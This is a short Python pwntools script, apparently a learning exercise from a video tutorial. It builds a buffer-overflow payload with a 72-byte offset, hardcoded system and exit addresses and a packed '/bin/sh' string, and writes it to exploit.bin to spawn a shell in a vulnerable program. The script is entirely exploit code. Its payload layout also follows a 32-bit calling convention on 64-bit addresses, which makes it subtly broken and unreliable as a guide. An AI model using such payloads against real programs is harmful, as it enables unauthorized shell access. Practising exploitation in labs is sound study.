#!/usr/bin/python
# LEARNED ON  https://www.youtube.com/watch?v=q-2O4XuLZAU
from pwn import *

menu_option = b'1'
offset = 72
junk = b'A' * offset

system = 0x7ffff7df33d0
exit = 0x7ffff7de5100
rshell = 0x68732f6e69622f



psystem = (p64(system))
pexit = (p64(exit))
prshell = (p64(rshell))

exploit = (junk + psystem + pexit + prshell)

print ("1\n")
print (exploit) 

f = open("exploit.bin", "wb")
f.write(menu_option)
f.write(exploit)
f.close()
